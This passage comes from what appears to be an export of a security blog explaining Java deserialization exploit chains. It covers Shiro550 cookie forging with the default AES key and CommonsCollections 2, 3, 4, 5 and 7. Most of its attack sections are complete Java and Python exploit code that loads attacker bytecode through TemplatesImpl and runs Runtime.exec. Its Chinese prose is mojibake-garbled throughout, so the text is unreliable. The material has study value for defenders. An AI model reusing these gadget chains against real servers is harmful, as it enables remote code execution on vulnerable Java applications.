ysoserial.payloads.util.Test;\n\n\nimport java.lang.reflect.Field;\nimport java.net.URL;\nimport java.util.HashMap;\n\nimport static ysoserial.payloads.util.Test.util.Serialize.serialize;\nimport static ysoserial.payloads.util.Test.util.Unserialize.unserialize;\n\npublic class URLDNSTest{\n    public static void main(String[] args) throws Exception{\n      // urlä¸ºæ¥æ”¶dnsè¯·æ±‚çš„url è‡ªå·±ä¿®æ”¹\n        URL url = new URL(\"xxx.com\");\n\n        Class c = url.getClass();\n        Field hashcodeField = c.getDeclaredField(\"hashCode\");\n        hashcodeField.setAccessible(true);\n        hashcodeField.set(url,1234);\n\n        HashMap hashMap = new HashMap();\n        hashMap.put(url,1);\n\n        hashcodeField.set(url,-1);\n        serialize(hashMap);\n\n    }\n}\n```\n\nè¿™æ˜¯æ ¹æ®shiroåŠ å¯†çš„é€»è¾‘å†™å‡ºçš„æ„é€ æ–°payloadçš„è„šæœ¬ï¼š\n\n```python\nimport base64\nimport uuid\nfrom random import Random\nfrom Crypto.Cipher import AES\n\ndef get_file_data(filename):\n    with open(filename, 'rb') as f:\n        data = f.read()\n    return data\n\ndef aes_enc(data):\n     BS = AES.block_size\n     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()\n     key = \"kPH+bIxk5D2deZiIxcaaaA==\"\n     mode = AES.MODE_CBC\n     iv = uuid.uuid4().bytes\n     encryptor = AES.new(base64.b64decode(key), mode, iv)\n     ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))\n     return ciphertext\n\ndef aes_dec(enc_data):\n    enc_data = base64.b64decode(enc_data)\n    unpad = lambda s : s[:-s[-1]]\n    key = \"kPH+bIxk5D2deZiIxcaaaA==\"\n    mode = AES.MODE_CBC\n    iv = enc_data[:16]\n    encryptor = AES.new(base64.b64decode(key), mode, iv)\n    plaintext = encryptor.decrypt(enc_data[16:])\n    plaintext = unpad(plaintext)\n    return plaintext\n\nif __name__ == '__main__':\n    data = get_file_data(\"ser.bin\")\n    print(aes_enc(data))\n```\n\næŠŠser.binå’Œè„šæœ¬æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹è¿è¡Œè„šæœ¬å³å¯ï¼š\n\n![image-20230608162831994](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230608162831994.png)\n\n![image-20230608162901350](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230608162901350.png)\n\næ›¿æ¢Cookieè¿›è¡Œå‘åŒ…ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¦å°†Cookieä¸­çš„SessionIdåˆ é™¤æ‰ï¼Œå¦åˆ™Shiroä¼šç›´æ¥ç”¨Sessionidè€Œä¸æ˜¯remembermeï¼š\n![image-20230608163110965](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230608163110965.png)\n\n![image-20230608163121777](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230608163121777.png)\n\nå…³äºå¦‚ä½•é€šè¿‡cbé“¾å‘½ä»¤æ‰§è¡Œå…ˆğŸ¦ä¸€æ‰‹ æœ‰ç©ºè¡¥ä¸Šæ¥\n","tags":["Shiro550ååºåˆ—åŒ–"],"categories":["WebSec"]},{"title":"CommonsCollections 2+4+5+7","url":"/2023/05/30/CommonsCollections-2-4-5-7/","content":"\n# CommonsCollections 2+4+5+7\n\n## CommonsCollections 4\n\næˆ‘ä»¬åœ¨ä¹‹å‰çš„CC3ä¸­æ˜¯é€šè¿‡åŠ¨æ€ç±»åŠ è½½åˆå§‹åŒ–ä¸€ä¸ªç±»ï¼Œä»è€Œæ‰§è¡Œç±»ä¸­æ„é€ çš„æ¶æ„ä»£ç ï¼ŒCC4å’ŒCC3çš„æœ€ç»ˆä»£ç æ‰§è¡Œä½ç½®éƒ½æ˜¯ç›¸åŒçš„ï¼Œä¸è¿‡å‰é¢çš„æ„é€ è¿‡ç¨‹å¯èƒ½ä¼šæœ‰ä¸€äº›å·®åˆ«ã€‚\n\nCC4è¿™æ¡é“¾ç”¨äº†CommonsCollections4è¿™ä¸ªä¾èµ–ä¸­çš„ä¸€äº›å±æ€§ï¼Œæˆ‘ä»¬å…ˆä»ChainedTransformer.transformå…¥æ‰‹ï¼Œå¾€å›æ‰¾å…¶ä»–çš„åˆ©ç”¨ç‚¹ï¼š\n\n![image-20230528100955152](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230528100955152.png)\n\næˆ‘ä»¬åœ¨CC4çš„compratorsåŒ…ä¸‹æ‰¾åˆ°äº†`TransformingComprator.compare`è¿™ä¸ªpublicæ–¹æ³•ï¼Œå¹¶ä¸”`TransformingComprator`è¿™ä¸ªç±»æ˜¯å¯åºåˆ—åŒ–çš„ï¼š\n\n![image-20230528101506635](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230528101506635.png)\n\næˆ‘ä»¬å†å¾€ä¸‹æ‰¾è°è°ƒç”¨äº†`TransformingComprator.compare`ï¼Œæœ€ååœ¨javaåŸç”ŸutilåŒ…ä¸‹æ‰¾åˆ°äº†`PriorityQueue`ï¼ˆä¼˜å…ˆé˜Ÿåˆ—ï¼‰ä¸­çš„`siftDownUsingComparator`æ–¹æ³•ï¼š\n\n![image-20230528102227728](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230528102227728.png)\n\nå¹¶ä¸”å°±åœ¨è¿™ä¸ªæ–¹æ³•çš„ä¸Šé¢ï¼Œ`siftdown`æ–¹æ³•è°ƒç”¨äº†`siftDownUsingComparator`æ–¹æ³•ï¼Œæ‰€ä»¥æ¥ç€æ‰¾å“ªé‡Œè°ƒç”¨äº†`siftdown`.\n\n![image-20230528102422276](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230528102422276.png)\n\nè¿˜æ˜¯åœ¨ä¼˜å…ˆé˜Ÿåˆ—è¿™ä¸ªç±»ä¸­ï¼Œ`heapify`æ–¹æ³•è°ƒç”¨äº†`siftdown`ï¼Œè¿™é‡Œè¦æ³¨æ„æƒ³è¦æˆåŠŸè°ƒç”¨siftDownï¼Œå°±è¦è®©`sizeè¿›è¡Œå³ç§»è¿ç®—å-1` >= 0ï¼Œæ‰€ä»¥è¿™é‡Œsizeè‡³å°‘è¦ä¸º2ï¼š\n\n![image-20230528102549322](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230528102549322.png)\n\nåœ¨å¾€ä¸‹æ‰¾ï¼Œæ‰¾åˆ°CC4çš„ç»ˆç‚¹ï¼Œåœ¨ä¼˜å…ˆé˜Ÿåˆ—çš„readObjectæ–¹æ³•ä¸­è°ƒç”¨äº†`heapify`ï¼š\n\n![image-20230528102647049](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230528102647049.png)\n\nå¯ä»¥å‘ç°CC4ä¸CC3å”¯ä¸€åœ¨CommonsCollectionsä¸­ä¾èµ–çš„ä¸åŒå°±æ˜¯åœ¨`TransformingComprator`è¿™ä¸ªç±»ä¸­ï¼Œå› ä¸ºä¼˜å…ˆé˜Ÿåˆ—æ˜¯javaä¸­è‡ªå¸¦çš„ä¸€ä¸ªå·¥å…·ç±»ï¼Œè€Œä¹‹æ‰€ä»¥è¿™æ¡åˆ©ç”¨é“¾åœ¨CC3ä¸­ç”¨ä¸äº†æ˜¯å› ä¸ºCC3åŒ…ä¸­è¿™ä¸ªç±»ä¸èƒ½ååºåˆ—åŒ–ï¼Œè€Œåœ¨CC4åŒ…ä¸­ï¼Œè¿™ä¸ªç±»å´ç»§æ‰¿äº†Serializableï¼Œæ‰€ä»¥åœ¨CC4ä¸­å°±å¯ä»¥ä½¿ç”¨è¿™æ¡é“¾è¿›è¡Œæ”»å‡»äº†\n\nCC3:\n\n![image-20230528104348059](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230528104348059.png)\n\nCC4:\n\n![image-20230528104155616](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230528104155616.png)\n\næ­£å‘æ„é€ åˆ©ç”¨é“¾ï¼š\n\n```Java\npackage ysoserial.payloads.util.Test.util;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport org.apache.commons.collections4.functors.ChainedTransformer;\nimport org.apache.commons.collections4.Transformer;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport org.apache.commons.collections4.functors.InstantiateTransformer;\n\nimport javax.xml.transform.Templates;\nimport java.io.IOException;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.PriorityQueue;\n\nimport static ysoserial.payloads.util.Test.util.Serialize.serialize;\nimport static ysoserial.payloads.util.Test.util.Unserialize.unserialize;\n\npublic class CC4Test {\n    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {\n        TemplatesImpl templatesimpl = new TemplatesImpl();\n        byte[] code  = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/webå®‰å…¨/Javaå®‰å…¨/ysoserial-master/target/classes/ysoserial/payloads/util/Test/Calc.class\"));\n        byte[][] codes = new byte[][]{code};\n        Class tem = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\");\n\n        Field bytecodes = tem.getDeclaredField(\"_bytecodes\");\n        bytecodes.setAccessible(true);\n        bytecodes.set(templatesimpl,codes);\n\n        Field name = tem.getDeclaredField(\"_name\");\n        name.setAccessible(true);\n        name.set(templatesimpl,\"aaa\");\n\n\n        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesimpl});\n        Transformer[] transformers = new Transformer[]{\n            new ConstantTransformer(TrAXFilter.class),\n            instantiateTransformer\n        };\n        ChainedTransformer ctf = new ChainedTransformer(transformers);\n\n        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(123));\n\n        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);\n\n        priorityQueue.add(1);\n        priorityQueue.add(2);\n\n        Field transformingComparatorFiled = transformingComparator.getClass().getDeclaredField(\"transformer\");\n        transformingComparatorFiled.setAccessible(true);\n        transformingComparatorFiled.set(transformingComparator,ctf);\n\n        serialize(priorityQueue);\n        unserialize(\"ser.bin\");\n\n    }\n}\n\n```\n\nâ€‹\t\n\n## CommonsCollections 2\n\nCC2è¿™æ¡é“¾å’ŒCC4ä¸åŒçš„æ˜¯åœ¨åŠ è½½æ¶æ„ç±»åï¼Œä¼šé€šè¿‡è°ƒç”¨`TemplatesImpl.newTransformer`ä»è€Œåˆå§‹åŒ–æ¶æ„ç±»ï¼Œæ‰§è¡Œä»£ç ï¼Œåœ¨CC4é“¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨TraxFilterç„¶åå†å¾€å‰æ¥ç€æ‰¾åˆ©ç”¨è¿ï¼Œè€ŒCC2åˆ™æ˜¯åœ¨è¿™é‡Œé€šè¿‡ç›´æ¥è°ƒç”¨`InvokerTransformer.transform`ç›´æ¥è°ƒç”¨`TemplatesImpl.newTransformer`:\n\n![image-20230530154856913](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230530154856913.png)\n\næ„é€ é“¾å¦‚ä¸‹ï¼š\n\n```java\npackage ysoserial.payloads.util.Test;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\n\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.PriorityQueue;\n\nimport static ysoserial.payloads.util.Test.util.Serialize.serialize;\nimport static ysoserial.payloads.util.Test.util.Unserialize.unserialize;\n\npublic class CC2Test {\n    public static void main(String[] args) throws Exception{\n        TemplatesImpl templatesimpl = new TemplatesImpl();\n        byte[] code  = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/webå®‰å…¨/Javaå®‰å…¨/ysoserial-master/target/classes/ysoserial/payloads/util/Test/Calc.class\"));\n        byte[][] codes = new byte[][]{code};\n        Class tem = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\");\n\n        Field bytecodes = tem.getDeclaredField(\"_bytecodes\");\n        bytecodes.setAccessible(true);\n        bytecodes.set(templatesimpl,codes);\n\n        Field name = tem.getDeclaredField(\"_name\");\n        name.setAccessible(true);\n        name.set(templatesimpl,\"aaa\");\n\n        InvokerTransformer invokerTransformer = new InvokerTransformer(\"newTransformer\",new Class[]{},new Object[]{});\n\n        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(123));\n\n        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);\n\n        priorityQueue.add(templatesimpl);\n        priorityQueue.add(2);\n\n        Field transformingComparatorFiled = transformingComparator.getClass().getDeclaredField(\"transformer\");\n        transformingComparatorFiled.setAccessible(true);\n        transformingComparatorFiled.set(transformingComparator,invokerTransformer);\n\n        serialize(priorityQueue);\n        unserialize(\"ser.bin\");\n\n\n\n    }\n}\n\n```\n\n\n\n## CommonsCollections 5 && CommonsCollections 7\n\nè¿™ä¸¤æ¡é“¾å­å°±å’ŒCC1ã€6çš„æ–¹å¼ä¸€æ ·äº†ï¼Œéƒ½æ˜¯é€šè¿‡è°ƒç”¨`Runtime.exec`æ¥å‘½ä»¤æ‰§è¡Œï¼Œä¸è¿‡è°ƒç”¨readObjectçš„å…¥å£ç‚¹ä¸ä¸€æ ·äº†ï¼Œå…·ä½“å¦‚ä¸‹ï¼š\n\nCC5:\n\nBadAttributeValueExpException.readObject -->  TiedMapEntry.toString  -->  LazyMap.getï¼Œåç»­åˆ™å’ŒCC1ä¸€æ ·\n\nCC7:\n\nHashTable.readObject  -->  AbstractMap.equals --> LazyMay.getï¼Œåç»­å’ŒCC1ä¸€æ ·\n\n\n\n## æ‰€æœ‰è°ƒç”¨é“¾çš„è°ƒç”¨è¿‡ç¨‹ï¼š\n\n![image-20230530161918857](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230530161918857.png)\n\n\n\n\n","tags":["Javaååºåˆ—åŒ–"],"categories":["WebSec"]},{"title":"CommonsCollections3","url":"/2023/05/20/CommonsCollections3/","content":"# CC1æ‰“ä¸é€šæ—¶çš„å¦å¤–ä¸€æ¡é“¾CC3\n\nåœ¨CC1å’ŒCC6ä¸­ï¼Œæˆ‘ä»¬æœ€ç»ˆå¼¹è®¡ç®—å™¨éƒ½æ˜¯é€šè¿‡`Runtime.exec`è¿›è¡Œè°ƒç”¨ï¼Œä»CC3æˆ‘ä»¬è¦ä»‹ç»ä¸€ç§ä¸é€šè¿‡Runtimeæ¥å¼¹è®¡ç®—å™¨çš„æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯Javaä¸­å¸¸æåˆ°çš„åŠ¨æ€ç±»åŠ è½½ï¼ŒåŠ¨æ€ç±»åŠ è½½å¯ä»¥è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªè·¯å¾„æ¥åŠ è½½ä¸€ä¸ªæ¶æ„ç±»ï¼Œå¦‚æœè¿™ä¸ªæ¶æ„ç±»åœ¨`é™æ€ä»£ç å—`æˆ–`æ„é€ ä»£ç å—`ä¸­å†™å…¥äº†æ¶æ„æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ‰¾ä¸€æ¡é“¾å­æ¥åˆå§‹åŒ–è¿™ä¸ªç±»ï¼ˆä¸€èˆ¬åœ¨è¿›è¡Œå®ä¾‹åŒ–æ—¶ä¼šå¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ï¼‰ï¼Œä»è€Œè¾¾åˆ°ä»£ç å—ä¸­çš„ä»£ç æ‰§è¡Œã€‚\n\nClassLoaderä¸­çš„defineClassæœ€ç»ˆå®ç°äº†ç±»çš„åŠ¨æ€åŠ è½½ï¼ˆåé¢è¿˜æœ‰ä¸€äº›è¿‡ç¨‹ä½†å·²ç»æ˜¯ä¾é cæ¥å®ç°çš„äº†ï¼‰ï¼Œåœ¨ClassLoaderä¸­å¯ä»¥çœ‹åˆ°ä¸€å †defineClassï¼Œæˆ‘ä»¬æŸ¥æ‰¾ç”¨æ³•ï¼Œçœ‹ä¸€ä¸‹å“ªä¸ªdefineClassåœ¨åˆ«å¤„è¢«è°ƒç”¨äº†ï¼Œè€Œä¸”æƒé™æœ€å¥½æ˜¯defaultæˆ–è€…publicï¼Œæ–¹ä¾¿æˆ‘ä»¬åˆ©ç”¨ï¼Œæœ€ç»ˆé”å®šä¸‹é¢è¿™ä¸ªï¼š\n\n```java\nprotected final Class<?> defineClass(String name, byte[] b, int off, int len)\n        throws ClassFormatError\n```\n\nè¿™ä¸ªdefineClassè¢«è°ƒç”¨çš„ç‚¹åœ¨`com.sun.org.apache.xalan.internal.xsltc.trax`ä¸­çš„`TemplatesImpl.TransletClassLoader`ä¸‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªdefineClassï¼š\n\n![image-20230206143718657](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143718657.png)\n\nè¿™ä¸ªdefineClassåˆåœ¨å½“å‰ç±»ä¸­è¢«`defineTransletClasses`è°ƒç”¨ï¼š\n\n![image-20230206143601848](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143601848.png)\n\n`defineTransletClasses`åŒç±»ä¸‹æœ‰ä¸‰ä¸ªè¢«è°ƒç”¨ç‚¹ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å“ªä¸ªæ–¹æ³•å¯ä»¥è¢«æˆ‘ä»¬åˆ©ç”¨ï¼š\n\n![image-20230206143620851](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143620851.png)\n\nç¬¬ä¸€ä¸ªè¿”å›`_class`ï¼š\n\n```java\nprivate synchronized Class[] getTransletClasses() {\n        try {\n            if (_class == null) defineTransletClasses();\n        }\n        catch (TransformerConfigurationException e) {\n            // Falls through\n        }\n        return _class;\n    }\n```\n\nç¬¬äºŒä¸ªè¿”å›äº†`_class`çš„ä¸‹æ ‡ï¼š\n\n```java\npublic synchronized int getTransletIndex() {\n        try {\n            if (_class == null) defineTransletClasses();\n        }\n        catch (TransformerConfigurationException e) {\n            // Falls through\n        }\n        return _transletIndex;\n    }\n```\n\nç¬¬ä¸‰ä¸ªæ–¹æ³•æˆ‘ä»¬ä¸»è¦çœ‹newInstanceè¿™é‡Œï¼Œè¿™ä¸ª`_class[_transletIndex]`å¯æ§ï¼ˆé€šè¿‡ä¸Šé¢æ‰¾åˆ°çš„`defineTransletClasses`åŠ¨æ€åŠ è½½è¿›æ¥ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬è®©_classä¸ºæˆ‘ä»¬æ‰€æ„é€ çš„æ¶æ„ç±»å¹¶è®©å®ƒnewInstanceï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‰§è¡Œæ¶æ„ç±»ä¸­çš„é™æ€/æ„é€ ä»£ç å—ä¸­çš„ä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ç€æ‰¾è¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨ç‚¹ï¼š\n\n```java\nprivate Translet getTransletInstance()\n        throws TransformerConfigurationException {\n        try {\n            if (_name == null) return null;\n\n            if (_class == null) defineTransletClasses();\n\n            // The translet needs to keep a reference to all its auxiliary\n            // class to prevent the GC from collecting them\n            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();\n```\n\nä¸‹ä¸€è°ƒç”¨ç‚¹è¿˜æ˜¯åœ¨è¿™ä¸ªç±»ä¸­ï¼Œæˆ‘ä»¬æ‰¾åˆ°newTransformer()è¿™ä¸ªæ–¹æ³•ï¼š\n\n```java\npublic synchronized Transformer newTransformer()\n        throws TransformerConfigurationException\n    {\n        TransformerImpl transformer;\n\n        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,\n            _indentNumber, _tfactory);\n```\n\næˆ‘ä»¬æ¥æ¢³ç†ä¸€ä¸‹åˆ°ç›®å‰çš„è°ƒç”¨é“¾ï¼Œå¾ˆçŸ­ä¹Ÿå¾ˆæ–¹ä¾¿ï¼š\n\n![image-20230206143637167](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143637167.png)\n\næˆ‘ä»¬å…ˆå°†payloadå†™å‡ºæ¥ï¼š\n\n```java\nTemplatesImpl templatesimpl = new TemplatesImpl();\n        templatesimpl.newTransformer();\n```\n\nå†™å®Œå•¦ ä¸‹ç­ï¼ï¼ˆå¼€ä¸ªç©ç¬‘ï¼‰é€»è¾‘ä¸Šæ¥è¯´è¿™ä¸¤è¡Œä»£ç ç¡®å®æ˜¯å®Œæ•´çš„è°ƒç”¨é“¾ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯å¯¹ç±»å†…éƒ¨çš„å„ç§å±æ€§è¿›è¡Œèµ‹å€¼ï¼š\n\n`newTransformer`å†…ä¸éœ€è¦è¿›è¡Œèµ‹å€¼æ“ä½œï¼Œè·Ÿè¿›åˆ°`getTransletInstance`ä¸­ ï¼Œç±»å†…æ²¡æœ‰å¯¹_nameå’Œ_classè¿›è¡Œèµ‹å€¼ï¼Œå¦‚æœæƒ³è¦è§¦å‘`defineTransletClasses()`æˆ‘ä»¬å°±éœ€è¦è®©_nameä¸ä¸ºç©ºï¼Œ_classä¸ºç©ºï¼Œç›´æ¥ä¸ç»™_classèµ‹å€¼å³å¯ï¼š\n\n```java\nif (_name == null) return null;\n\nif (_class == null) defineTransletClasses();\n```\n\nç»§ç»­è·Ÿè¿›åˆ°`defineTransletClasses`ä¸­ ï¼Œå¦‚æœæƒ³è¦èµ°åˆ°ä¸‹é¢åŠ¨æ€åŠ è½½_classï¼Œæˆ‘ä»¬è¿™é‡Œè¦æ³¨æ„å¯¹_tfactoryè¿›è¡Œèµ‹å€¼ï¼Œå¦åˆ™å¯¹ä¸€ä¸ªç©ºå±æ€§è°ƒç”¨æ–¹æ³•ï¼Œä¼šçˆ†ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼š\n\n```java\nreturn new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());\n```\n\nä¸Šä¸€æ­¥ä¹‹åæˆ‘ä»¬åœ¨å¯¹_classèµ‹å€¼è¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯é€šè¿‡ä¿®æ”¹`_bytecodes`ä»è€Œæ§åˆ¶_classçš„å€¼ï¼š\n\n```java\nfor (int i = 0; i < classCount; i++) {\n                _class[i] = loader.defineClass(_bytecodes[i]);\n```\n\nä¸€å…±ä¸‰ä¸ªéœ€è¦ä¿®æ”¹çš„å€¼ï¼ŒTemplatesImplç±»æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡åå°„ä¿®æ”¹è¿™äº›å€¼ï¼Œçœ‹ä¸€ä¸‹è¿™å‡ ä¸ªå€¼çš„ç±»å‹:\n\n```java\nprivate String _name = null;\nprivate byte[][] _bytecodes = null;\nprivate transient TransformerFactoryImpl _tfactory = null;\n```\n\néƒ½æ˜¯privateå±æ€§ï¼Œæ‰€ä»¥è¦ç”¨`setAccessible` æ¥ä¿®æ”¹è®¿é—®æƒé™ï¼Œnameæ˜¯Stringç±»å‹ï¼Œæ‰€ä»¥ç›´æ¥èµ‹ä¸ªå­—ç¬¦ä¸²å°±è¡Œï¼š\n\n```java\n\t\t\t\tClass tmp = templatesimpl.getClass();\n        Field nameField = tmp.getDeclaredField(\"_name\");\n        nameField.setAccessible(true);\n        nameField.set(templatesimpl,\"y1\");\n```\n\nå†çœ‹`_bytecodes`ï¼Œä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œä½†æˆ‘ä»¬åœ¨ç»™_classèµ‹å€¼æ—¶defineClassæ¥å—çš„å´æ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼š\n\n```java\nfor (int i = 0; i < classCount; i++) {\n                _class[i] = loader.defineClass(_bytecodes[i]);\n\nClass defineClass(final byte[] b) {\n            return defineClass(null, b, 0, b.length);\n```\n\næ‰€ä»¥æˆ‘ä»¬ç»™`_bytecodes` èµ‹å€¼æ—¶å¯ä»¥å°†defineClassæ¥æ”¶çš„ä¸€ç»´æ•°ç»„æ”¾è¿›_bytecodesè¿™ä¸ªäºŒç»´æ•°ç»„ä¸­ï¼Œè¿™æ ·åœ¨è¿›è¡Œforå¾ªç¯éå†æ—¶å°±å¯ä»¥å°†è¿™ä¸ªä¸€ç»´æ•°ç»„éå†å‡ºæ¥å¹¶ä¼ ç»™defineClassï¼Œè¿™ä¸ªclasséœ€è¦æˆ‘ä»¬åœ¨å†™å¥½javaæºç åæ‰‹åŠ¨ç¼–è¯‘ä¸ºclassæ–‡ä»¶ï¼Œæœ€å¥½æŠŠè¿™ä¸ªclassæ–‡ä»¶å¤åˆ¶åˆ°ç”µè„‘ä¸Šçš„åˆ«çš„åœ°æ–¹å†åœ¨è¿™é‡Œä½¿ç”¨ï¼ˆç¼–è¯‘åçš„classæ–‡ä»¶ä¸€èˆ¬åœ¨targetä¸‹ï¼‰ï¼š\n\n```java\nField bytecodesField = tmp.getDeclaredField(\"_bytecodes\");\n        bytecodesField.setAccessible(true);\n        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));\n        byte[][] codes = {code};\n        bytecodesField.set(templatesimpl,codes);\n```\n\n```java\nTest.class\n\npublic class Calc {\n    static{\n        try {\n            Runtime.getRuntime().exec(\"open -na Calculator\"); //è¿™é‡Œæ˜¯macå¼¹è®¡ç®—å™¨çš„å‘½ä»¤\n        } catch (IOException e) {                             //winä¸‹è¿˜æ˜¯calc\n            throw new RuntimeException(e);\n        }\n\n    }\n}\n```\n\nç„¶åæˆ‘ä»¬å†æ¥æ”¹_tfactoryçš„å€¼ï¼š\n\nè¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œè¢«transientå…³é”®å­—ä¿®é¥°çš„å±æ€§æ˜¯ä¸å‚ä¸åºåˆ—åŒ–çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å°±ç®—æˆ‘ä»¬é€šè¿‡åå°„ä¿®æ”¹äº†å®ƒçš„å€¼ï¼Œååºåˆ—åŒ–åçš„äºŒè¿›åˆ¶æµè¿™ä¸ªå±æ€§çš„å€¼ä¹Ÿä¾æ—§æ˜¯nullï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è¦ç”¨å…¶ä»–çš„æ–¹å¼èµ‹å€¼\n\n```java\nprivate transient TransformerFactoryImpl _tfactory = null;\n```\n\næˆ‘ä»¬åœ¨readObjectä¸­å‘ç°æœ‰å¯¹è¿™äº›å±æ€§è¿›è¡Œèµ‹å€¼çš„æ“ä½œï¼Œ_tfactoryçš„å€¼æ˜¯ä¸€ä¸ªTransformerFactoryImplå®ä¾‹ï¼š\n\n```java\n_name = (String)gf.get(\"_name\", null);\n   //ä»¥ä¸‹å‡ è¡Œä»£ç å¯¹åºåˆ—åŒ–æµä¸­çš„å±æ€§è¯»å–å®ƒä»¬çš„å€¼ï¼Œå¦‚æœè¯»ä¸åˆ°å€¼é‚£ä¹ˆå°†å®ƒçš„å€¼è®¾ä¸ºé»˜è®¤å€¼ï¼ˆç¬¬äºŒä¸ªå‚æ•°ï¼‰    \n\t\t\t  _bytecodes = (byte[][])gf.get(\"_bytecodes\", null);\n        _class = (Class[])gf.get(\"_class\", null);\n        _transletIndex = gf.get(\"_transletIndex\", -1);\n\n        _outputProperties = (Properties)gf.get(\"_outputProperties\", null);\n        _indentNumber = gf.get(\"_indentNumber\", 0);\n\n        if (is.readBoolean()) {\n            _uriResolver = (URIResolver) is.readObject();\n        }\n\n        _tfactory = new TransformerFactoryImpl();\n    }\n```\n\næˆ‘ä»¬å…ˆä¸è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œæˆ‘ä»¬å…ˆç”¨åå°„ä¿®æ”¹_tfactoryçš„å€¼ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½å¼¹è®¡ç®—å™¨ï¼ˆè¿™é‡Œæˆ‘ä»¬å¹¶æ²¡æœ‰è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œæ‰€ä»¥å…¶å®å°±æ˜¯ç”¨åå°„ä¿®æ”¹äº†ä¸ªå€¼ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥ä¿®æ”¹æˆåŠŸçš„ï¼‰ï¼š\n\n```java\nTemplatesImpl templatesimpl = new TemplatesImpl();\n        Class tmp = templatesimpl.getClass();\n\n        Field nameField = tmp.getDeclaredField(\"_name\");\n        nameField.setAccessible(true);\n        nameField.set(templatesimpl,\"y1\");\n\n        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");\n        bytecodesField.setAccessible(true);\n        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));\n        byte[][] codes = {code};\n        bytecodesField.set(templatesimpl,codes);\n\n        Field tfactoryfield = 